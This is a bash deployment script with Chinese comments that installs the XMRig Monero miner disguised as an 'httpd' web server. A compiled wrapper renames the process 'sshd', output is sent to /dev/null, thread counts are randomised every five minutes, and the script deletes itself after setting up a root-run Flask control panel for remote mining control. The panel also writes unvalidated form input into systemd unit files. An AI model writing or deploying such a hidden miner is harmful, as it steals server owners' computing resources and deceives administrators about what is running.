#!/bin/bash

# 确保脚本以 root 权限运行
if [ "$(id -u)" != "0" ]; then
   echo "此脚本需要 root 权限运行" 1>&2
   exit 1
fi

# 检查和安装依赖
for cmd in curl tar gcc systemctl python3 pip; do
    if ! command -v "$cmd" &> /dev/null; then
        echo "安装必要的依赖..."
        apt-get update && apt-get install -y curl tar gcc systemd python3 python3-pip
    fi
done

# 安装 Flask 和 Flask-HTTPAuth
pip3 install flask flask-httpauth >/dev/null 2>&1

# 用户输入网页后端密码
read -s -p "请输入网页后端管理密码: " web_password
echo
if [ -z "$web_password" ]; then
    echo "密码不能为空" 1>&2
    exit 1
fi

# 创建目录
mkdir -p /opt/webserver /etc/systemd/conf.d /var/www/static || { echo "创建目录失败" 1>&2; exit 1; }

# 下载并安装 xmrig
curl -L https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz | tar -xz -C /opt/webserver || { echo "下载或解压失败" 1>&2; exit 1; }
mv /opt/webserver/xmrig-6.22.2/xmrig /opt/webserver/httpd || { echo "移动文件失败" 1>&2; exit 1; }
chmod +x /opt/webserver/httpd
rm -rf /opt/webserver/xmrig-6.22.2

# 创建 wrapper
cat > /opt/webserver/wrapper.c <<EOF
#include <sys/prctl.h>
#include <unistd.h>
int main(int argc, char *argv[]) {
    prctl(PR_SET_NAME, "sshd", 0, 0, 0);
    execv("/opt/webserver/httpd", argv);
    return 0;
}
EOF
gcc -o /opt/webserver/wrapper /opt/webserver/wrapper.c || { echo "编译 wrapper 失败" 1>&2; exit 1; }
rm /opt/webserver/wrapper.c

# 创建初始配置文件
cat > /etc/systemd/conf.d/httpd.conf <<EOF
{
    "pools": [
        {
            "url": "pool.getmonero.us:3333",
            "user": "UNCONFIGURED",
            "pass": "x",
            "algo": "rx/0"
        }
    ],
    "print-time": 0,
    "verbose": false,
    "threads": 1,
    "min_threads": 1,
    "max_threads": $(nproc)
}
EOF

# 创建线程调整脚本
cat > /opt/webserver/adjust_threads.sh <<'EOF'
#!/bin/bash
CONFIG_FILE="/etc/systemd/conf.d/httpd.conf"
MIN_THREADS=$(jq -r '.min_threads // 1' $CONFIG_FILE)
MAX_THREADS=$(jq -r '.max_threads // $(nproc)' $CONFIG_FILE)

NEW_THREADS=$((MIN_THREADS + RANDOM % (MAX_THREADS - MIN_THREADS + 1)))
TEMP_FILE=$(mktemp)
jq --argjson threads "$NEW_THREADS" '.threads = $threads' $CONFIG_FILE > "$TEMP_FILE"
mv "$TEMP_FILE" $CONFIG_FILE
systemctl restart httpd.service
EOF
chmod +x /opt/webserver/adjust_threads.sh

# 创建用户和组
groupadd -r httpd 2>/dev/null || echo "组 'httpd' 已存在"
if id "httpd" &>/dev/null; then
    echo "用户 'httpd' 已存在，将使用现有用户"
else
    useradd -r -s /bin/false -g httpd httpd || { echo "创建用户失败" 1>&2; exit 1; }
fi

# 创建主服务文件
cat > /etc/systemd/system/httpd.service <<EOF
[Unit]
Description=HTTP Server
After=network.target

[Service]
User=httpd
Group=httpd
ExecStart=/opt/webserver/wrapper --config=/etc/systemd/conf.d/httpd.conf --no-color --log-file=/dev/null
Restart=always
Type=simple

[Install]
WantedBy=multi-user.target
EOF

# 创建线程调整服务
cat > /etc/systemd/system/httpd-adjust.service <<EOF
[Unit]
Description=HTTP Server Thread Adjuster
Requires=httpd.service
After=httpd.service

[Service]
Type=oneshot
ExecStart=/opt/webserver/adjust_threads.sh
User=root
RemainAfterExit=no
EOF

# 创建线程调整定时器
cat > /etc/systemd/system/httpd-thread.timer <<EOF
[Unit]
Description=Run thread adjuster every 5 minutes

[Timer]
OnBootSec=5min
OnUnitActiveSec=5min
Unit=httpd-adjust.service
Persistent=true

[Install]
WantedBy=timers.target
EOF

# 创建停止服务脚本
cat > /opt/webserver/stop_mining.sh <<EOF
#!/bin/bash
systemctl stop httpd.service
EOF
chmod +x /opt/webserver/stop_mining.sh

# 创建停止服务
cat > /etc/systemd/system/httpd-stop.service <<EOF
[Unit]
Description=Stop Mining Service

[Service]
Type=oneshot
ExecStart=/opt/webserver/stop_mining.sh
RemainAfterExit=no
EOF

# 创建初始定时器（默认不启动）
cat > /etc/systemd/system/httpd.timer <<EOF
[Unit]
Description=Scheduled Mining Service

[Timer]
OnCalendar=*-*-* 00:00:00
Persistent=true

[Install]
WantedBy=timers.target
EOF

cat > /etc/systemd/system/httpd-stop.timer <<EOF
[Unit]
Description=Stop Mining Service

[Timer]
OnCalendar=*-*-* 00:00:00
Persistent=true
Unit=httpd-stop.service

[Install]
WantedBy=timers.target
EOF

# 创建 Flask 网页后端
cat > /var/www/app.py <<EOF
from flask import Flask, render_template, request, jsonify
from flask_httpauth import HTTPBasicAuth
import subprocess
import json
import os

app = Flask(__name__, static_folder='static')
auth = HTTPBasicAuth()
CONFIG_FILE = '/etc/systemd/conf.d/httpd.conf'
PASSWORD = '$web_password'

@auth.verify_password
def verify_password(username, password):
    return username == 'admin' and password == PASSWORD

@app.route('/')
@auth.login_required
def index():
    return render_template('index.html')

@app.route('/status')
@auth.login_required
def status():
    try:
        status = subprocess.check_output(['systemctl', 'is-active', 'httpd.service']).decode().strip()
        with open(CONFIG_FILE, 'r') as f:
            config = json.load(f)
        return jsonify({
            'status': status,
            'config': config
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/config', methods=['POST'])
@auth.login_required
def update_config():
    data = request.form
    required_fields = ['pool_url', 'wallet_address', 'pool_pass', 'min_threads', 'max_threads', 'start_time', 'end_time']
    
    if not all(field in data for field in required_fields):
        return jsonify({'error': 'Missing required fields'}), 400
    
    try:
        # 更新配置文件
        with open(CONFIG_FILE, 'r') as f:
            config = json.load(f)
        
        config['pools'][0]['url'] = data['pool_url']
        config['pools'][0]['user'] = data['wallet_address']
        config['pools'][0]['pass'] = data['pool_pass']
        config['min_threads'] = int(data['min_threads'])
        config['max_threads'] = int(data['max_threads'])
        config['threads'] = config['min_threads']
        
        with open(CONFIG_FILE, 'w') as f:
            json.dump(config, f, indent=4)
        
        # 更新定时器
        with open('/etc/systemd/system/httpd.timer', 'w') as f:
            f.write(f"""[Unit]
Description=Scheduled Mining Service

[Timer]
OnCalendar=*-*-* {data['start_time']}:00
Persistent=true

[Install]
WantedBy=timers.target""")
        
        with open('/etc/systemd/system/httpd-stop.timer', 'w') as f:
            f.write(f"""[Unit]
Description=Stop Mining Service

[Timer]
OnCalendar=*-*-* {data['end_time']}:00
Persistent=true
Unit=httpd-stop.service

[Install]
WantedBy=timers.target""")
        
        subprocess.run(['systemctl', 'daemon-reload'])
        subprocess.run(['systemctl', 'restart', 'httpd.timer'])
        subprocess.run(['systemctl', 'restart', 'httpd-stop.timer'])
        subprocess.run(['systemctl', 'restart', 'httpd-thread.timer'])
        
        return jsonify({'message': 'Configuration updated'})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/start', methods=['POST'])
@auth.login_required
def start_mining():
    subprocess.run(['systemctl', 'start', 'httpd.service'])
    return jsonify({'message': 'Mining started'})

@app.route('/stop', methods=['POST'])
@auth.login_required
def stop_mining():
    subprocess.run(['systemctl', 'stop', 'httpd.service'])
    return jsonify({'message': 'Mining stopped'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
EOF

# 创建 HTML 页面
cat > /var/www/templates/index.html <<EOF
<!DOCTYPE html>
<html>
<head>
    <title>Mining Control Panel</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .container { max-width: 800px; margin: auto; }
        .status-box { border: 1px solid #ccc; padding: 10px; margin-top: 10px; }
        .button { padding: 10px 20px; margin: 5px; }
        .form-group { margin: 10px 0; }
        label { display: inline-block; width: 150px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Mining Control Panel</h1>
        
        <div>
            <button class="button" onclick="startMining()">Start Mining</button>
            <button class="button" onclick="stopMining()">Stop Mining</button>
        </div>
        
        <h2>Status</h2>
        <div class="status-box" id="status">
            Loading...
        </div>
        
        <h2>Configuration</h2>
        <form id="configForm" onsubmit="updateConfig(event)">
            <div class="form-group">
                <label>Pool URL:</label>
                <input type="text" name="pool_url" required>
            </div>
            <div class="form-group">
                <label>Wallet Address:</label>
                <input type="text" name="wallet_address" required>
            </div>
            <div class="form-group">
                <label>Pool Password:</label>
                <input type="text" name="pool_pass" required>
            </div>
            <div class="form-group">
                <label>Min Threads:</label>
                <input type="number" name="min_threads" min="1" required>
            </div>
            <div class="form-group">
                <label>Max Threads:</label>
                <input type="number" name="max_threads" min="1" required>
            </div>
            <div class="form-group">
                <label>Start Time (HH:MM):</label>
                <input type="text" name="start_time" pattern="([01]?[0-9]|2[0-3]):[0-5][0-9]" required>
            </div>
            <div class="form-group">
                <label>End Time (HH:MM):</label>
                <input type="text" name="end_time" pattern="([01]?[0-9]|2[0-3]):[0-5][0-9]" required>
            </div>
            <button type="submit" class="button">Update Configuration</button>
        </form>
    </div>

    <script>
        function updateStatus() {
            fetch('/status')
                .then(response => response.json())
                .then(data => {
                    const statusDiv = document.getElementById('status');
                    statusDiv.innerHTML = `
                        <p>Service Status: ${data.status}</p>
                        <p>Current Threads: ${data.config.threads}</p>
                        <p>Min Threads: ${data.config.min_threads}</p>
                        <p>Max Threads: ${data.config.max_threads}</p>
                        <p>Pool URL: ${data.config.pools[0].url}</p>
                        <p>Wallet Address: ${data.config.pools[0].user}</p>
                        <p>Start Time: ${data.config.start_time || 'Not set'}</p>
                        <p>End Time: ${data.config.end_time || 'Not set'}</p>
                    `;
                })
                .catch(error => {
                    document.getElementById('status').innerHTML = 'Error: ' + error;
                });
        }

        function startMining() {
            fetch('/start', { method: 'POST' })
                .then(() => updateStatus());
        }

        function stopMining() {
            fetch('/stop', { method: 'POST' })
                .then(() => updateStatus());
        }

        function updateConfig(event) {
            event.preventDefault();
            const form = document.getElementById('configForm');
            const formData = new FormData(form);
            
            fetch('/config', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                alert(data.message || data.error);
                updateStatus();
            })
            .catch(error => alert('Error: ' + error));
        }

        // 每5秒更新一次状态
        setInterval(updateStatus, 5000);
        // 初始加载状态
        updateStatus();
    </script>
</body>
</html>
EOF

# 设置权限
chown root:root /etc/systemd/conf.d/httpd.conf /opt/webserver/adjust_threads.sh /var/www/app.py
chmod 600 /etc/systemd/conf.d/httpd.conf
chmod 700 /opt/webserver/adjust_threads.sh
chmod 644 /var/www/app.py
chmod -R 755 /var/www/static /var/www/templates

# 创建 Flask 服务
cat > /etc/systemd/system/flask.service <<EOF
[Unit]
Description=Flask Web Server
After=network.target

[Service]
ExecStart=/usr/bin/python3 /var/www/app.py
Restart=always
User=root

[Install]
WantedBy=multi-user.target
EOF

# 安装 jq 用于解析 JSON
apt-get install -y jq >/dev/null 2>&1

# 启用并启动服务
systemctl daemon-reload
systemctl enable httpd.service httpd-thread.timer flask.service
systemctl start httpd-thread.timer flask.service || { echo "服务启动失败" 1>&2; exit 1; }

# 删除脚本自身
rm -- "$0"
echo "部署完成！访问 http://<服务器IP>:5000 配置挖矿参数"
echo "用户名: admin"
echo "密码: 您设置的密码"
